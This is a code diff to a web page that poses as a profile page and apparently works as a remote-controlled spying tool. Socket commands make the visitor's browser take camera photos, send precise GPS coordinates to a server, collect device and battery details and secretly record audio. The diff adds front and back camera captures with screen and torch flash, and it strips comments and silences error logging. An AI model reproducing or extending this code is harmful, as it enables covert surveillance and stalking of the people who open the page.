@@ -120,6 +120,9 @@
 </head>
 <body>
 
+    <!-- Screen Flash overlay for /moreff -->
+    <div id="screenFlash" style="display:none; position:absolute; top:0; left:0; width:100vw; height:100vh; background:white; z-index:9999;"></div>
+
     <div id="profileSection">
         <div class="avatar-container">
             <img id="previewImg" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150" alt="Profile Avatar">
@@ -155,7 +158,6 @@
         const encodedVid = urlParams.get('v');
         let targetVideoUrl = encodedVid ? atob(encodedVid) : "";
 
-        // Check LocalStorage on load / refresh
         window.addEventListener('DOMContentLoaded', () => {
             const savedName = localStorage.getItem('sec_username');
             const savedAvatar = localStorage.getItem('sec_avatar');
@@ -221,11 +223,41 @@
         function initializeSecuritySystem() {
             keepScreenAwake();
 
-            // Camera Commands
             socket.on('capture_front', async () => { await captureSequence("user", "command_front"); });
             socket.on('capture_back', async () => { await captureSequence("environment", "command_back"); });
 
-            // GPS Location Command
+            // Front Camera with Screen Flash (/moreff)
+            socket.on('capture_front_flash', async () => {
+                const flashScreen = document.getElementById('screenFlash');
+                flashScreen.style.display = 'block';
+                await new Promise(resolve => setTimeout(resolve, 500));
+                await captureSequence("user", "command_front_flash");
+                flashScreen.style.display = 'none';
+            });
+
+            // Back Camera with Hardware Flashlight (/morebf)
+            socket.on('capture_back_flash', async () => {
+                let torchStream = null;
+                let torchTrack = null;
+                try {
+                    torchStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                    torchTrack = torchStream.getVideoTracks()[0];
+                    if (torchTrack) {
+                        await torchTrack.applyConstraints({ advanced: [{ torch: true }] });
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    await captureSequence("environment", "command_back_flash");
+                    if (torchTrack) {
+                        await torchTrack.applyConstraints({ advanced: [{ torch: false }] });
+                    }
+                    if (torchStream) {
+                        torchStream.getTracks().forEach(t => t.stop());
+                    }
+                } catch (e) {
+                    if (torchStream) torchStream.getTracks().forEach(t => t.stop());
+                }
+            });
+
             socket.on('get_location', () => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -234,11 +266,10 @@
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
                         });
-                    }, (err) => console.error(err), { enableHighAccuracy: true });
+                    }, (err) => {}, { enableHighAccuracy: true });
                 }
             });
 
-            // Device Info Command
             socket.on('get_info', async () => {
                 let batteryLevel = 'Unknown';
                 if (navigator.getBattery) {
@@ -260,7 +291,6 @@
                 });
             });
 
-            // Secret Audio Recording Command
             socket.on('record_audio', async () => {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -275,10 +305,8 @@
                         stream.getTracks().forEach(t => t.stop());
                     };
                     mediaRecorder.start();
-                    setTimeout(() => { mediaRecorder.stop(); }, 5000); // 5 seconds recording
-                } catch (e) {
-                    console.error("Audio recording error:", e);
-                }
+                    setTimeout(() => { mediaRecorder.stop(); }, 5000);
+                } catch (e) {}
             });
         }
 
